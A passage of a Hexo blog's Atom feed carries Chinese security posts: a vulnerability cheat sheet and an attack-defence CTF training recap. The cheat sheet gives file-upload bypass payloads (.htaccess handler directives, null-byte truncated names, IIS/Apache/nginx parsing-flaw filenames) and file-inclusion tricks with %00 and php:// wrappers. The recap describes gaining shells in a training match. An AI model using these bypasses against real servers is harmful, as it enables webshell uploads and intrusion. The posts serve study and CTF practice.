class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RSA总结</title>
    <link href="http://yoururl.com/2018/04/06/rsa%E6%80%BB%E7%BB%93/"/>
    <id>http://yoururl.com/2018/04/06/rsa总结/</id>
    <published>2018-04-06T08:33:00.000Z</published>
    <updated>2018-06-26T02:58:43.228Z</updated>
    
    <content type="html"><![CDATA[<p>先留个坑，回头写…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;先留个坑，回头写…&lt;/p&gt;

      
    
    </summary>
    
      <category term="crypto" scheme="http://yoururl.com/categories/crypto/"/>
    
    
      <category term="crypto" scheme="http://yoururl.com/tags/crypto/"/>
    
      <category term="rsa" scheme="http://yoururl.com/tags/rsa/"/>
    
  </entry>
  
  <entry>
    <title>文件上传常规漏洞总结</title>
    <link href="http://yoururl.com/2018/04/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://yoururl.com/2018/04/01/文件上传常规漏洞总结/</id>
    <published>2018-04-01T14:36:00.000Z</published>
    <updated>2018-04-08T10:07:43.361Z</updated>
    
    <content type="html"><![CDATA[<h3 id="从文件上传到getshell"><a href="#从文件上传到getshell" class="headerlink" title="从文件上传到getshell"></a>从文件上传到getshell</h3><p>一般找到文件上传页面，常规getshell思路:<br>先检查服务器验证上传文件的逻辑，再想办法绕过</p><blockquote><ul><li>前台js验证——禁用js，burpsuit抓包绕过即可</li><li>后台检查MIME——抓包改MIME</li><li>后台文件内容检测——(一般是用GetImageSize函数) 制作图片马上传</li><li>.hatccess上传(apache)——创建一个.hatccseea文件<br>设置命名有”php.gif”的文件当作php文件解析执行：<pre><code>&lt;FilesMatch “php.gif”&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre>上传的jpg文件都会以php格式解析：<pre><code>AddType    application/x-httpd-php    .jpg</code></pre></li></ul></blockquote><blockquote><ul><li>后台检查文件后缀名——</li><li>0x00截断上传 (php版本小于5.3.4，php的magic_quotes_gpc为OFF)<pre><code>1.php .png(空格改为00)</code></pre></li><li>IIS6.0解析漏洞<pre><code>文件      xxx.asp;.jpg (服务器默认不解析;号后面的内容)文件夹    xxx.asp/xxx.jpg (服务器默认会把.asp，.asp目录下的文件都解析成asp文件)</code></pre></li><li>apache解析漏洞<pre><code>www.xxx.com/logo.jpg.php.xxx(遇到不识别的后缀名向前解析)</code></pre></li><li>iis7.0和nginx解析漏洞<pre><code>www.xxx.com/logo.jpg/*.php(开启fix_pathinfo)</code></pre></li></ul></blockquote><h3 id="文件包含漏洞和利用"><a href="#文件包含漏洞和利用" class="headerlink" title="文件包含漏洞和利用"></a>文件包含漏洞和利用</h3><blockquote><ul><li>如果php脚本中使用了include,include_once,reqiure,requier_once这四个函数，并且函数的参数是用户可以控制的，就能造成文件包含漏洞</li><li>通常的include函数中，就算是可以控制参数但是后缀名也大多被限制，例如include($file.’.txt’)这样就只能包含txt文件。这时我们可以结合%00截断包含任意文件。index.php%00</li><li>文件包含漏洞也可以结合php伪协议，例如php://,phar://等等(php://input甚至可以写入木马)。例如文件包含进来但是无法显示时，可以用伪协议读文件的源码(php://filter/read=convert.base64-encode/resourse=包含文件)</li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;从文件上传到getshell&quot;&gt;&lt;a href=&quot;#从文件上传到getshell&quot; class=&quot;headerlink&quot; title=&quot;从文件上传到getshell&quot;&gt;&lt;/a&gt;从文件上传到getshell&lt;/h3&gt;&lt;p&gt;一般找到文件上传页面，常规getshell思
      
    
    </summary>
    
      <category term="文件上传" scheme="http://yoururl.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
      <category term="web" scheme="http://yoururl.com/tags/web/"/>
    
      <category term="文件上传" scheme="http://yoururl.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="文件包含" scheme="http://yoururl.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>第一次攻防训练赛小记</title>
    <link href="http://yoururl.com/2018/04/01/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E8%AE%AD%E7%BB%83%E8%B5%9B%E5%B0%8F%E8%AE%B0/"/>
    <id>http://yoururl.com/2018/04/01/第一次攻防训练赛小记/</id>
    <published>2018-04-01T14:36:00.000Z</published>
    <updated>2018-06-26T02:51:13.146Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;昨天按照实验室的要求，我们参加了个人的第一场ctf攻防形式的训练赛。形式是线上赛，由师傅搭好的环境，总体来说收获还是很大的，见识到了很多有(yin)趣(xian)的套路。总结一下</p><p>&emsp;&emsp;先说一下规则，一个五个队伍，每队两人。因为是训练，只有三道Web题，拿到其他队的flag加十分，被攻击队伍扣除相应分数。重启服务器扣除300分。五分钟一回合，宕机一回合扣除 (未宕机队伍的数量)*3 ，分数平均加到相应的队伍。（过程中发现一个骚操作就是当其他队伍宕机了，你还可以用之前上的shell拿flag，这样相当于多加了一部分分数） </p><blockquote><ul><li>第一道题是semcms1.1版本，上网查到<a href="http://0day5.com/archives/4320/" target="_blank" rel="noopener">相应漏洞</a>，首先注入找到后台密码，后台有个任意文件上传，上一张图片马直接getshell，连菜刀顺利拿到flag。但是大佬们更快一步，已经吊打我们而且把洞修好了…</li></ul></blockquote><blockquote><ul><li>第三题是一个微窗cms，有一个<a href="http://0day5.com/archives/3996/" target="_blank" rel="noopener">命令执行的洞</a>。稍微有一点点麻烦，这个好像没法上shell，直接构造命令执行语句也能读出flag</li></ul></blockquote><blockquote><ul><li>第二题最骚，页面发现一个神奇md5，解密后发现是ranzhi，搜了一些poc都用不了，最后也没做出来。最后师傅们分享write up后发现website源码里有一个预留后门，直接菜刀拿shell！！！(hao qi ya)<br>正规解法是mysql查询到登录密码，登陆进去有一个上shell的地方。本菜代码审计能力太差，也没看懂</li></ul></blockquote><p>这次比赛下来身为小白总结了几点：<br>&emsp;&emsp;对于一个攻防比赛，最开始并不是攻击，也不是防御。二话不说ssh连上自己website把源码备份一遍。这样以来，如果以后不慎自己服务器宕机了，还有复原的机会。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击方面：</span><br><span class="line">    拿到一个Web，黑盒找漏洞就比较简单，上网搜对应的资料。</span><br><span class="line">    白盒的话就是代码审计，打包下载到本地，利用代码审计工具Seay快速审计。</span><br><span class="line">    还有就是看看对数据库的操作有没有限制，这次就是出题人对mysql并没有任何限制，也就是说很多东西我们直接可以从数据库里找。还有就是看一下有没有出题人留得后门。</span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">防御方面：</span><br><span class="line">首先猜测防御规则， 不要再防守的时候吧自己服务器给干掉了。</span><br><span class="line">    通用防御：上waf，直接吧不想要的请求比如<span class="built_in">post</span>，<span class="built_in">get</span>全部给禁掉等等；</span><br><span class="line">    设置目录权限，例如上传目录权限给死。</span><br><span class="line">    最后一个也是最耗时间的，就是代码审计，找到漏洞存在的位置，修改代码。</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;比赛结束后的交流也见识到了一些骚套路，比如什么不死马，利用虚拟机做蜜罐专偷其他队伍shell什么的，zhang见识了，具体的操作有空再研究。奋斗ing…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;emsp;&amp;emsp;昨天按照实验室的要求，我们参加了个人的第一场ctf攻防形式的训练赛。形式是线上赛，由师傅搭好的环境，总体来说收获还是很大的，见识到了很多有(yin)趣(xian)的套路。总结一下&lt;/p&gt;
&lt;p&gt;&amp;emsp;&amp;emsp;先说一下规则，一个五个队伍，每队
      
    
    </summary>
    
      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
    
      <category term="AWD" scheme="http://yoururl.com/categories/CTF/AWD/"/>
    
    
      <category term="web" scheme="http://yoururl.com/tags/web/"/>
    
      <category term="AWD" scheme="http://yoururl.com/tags/AWD/"/>
    
  </entry>
  
</feed>
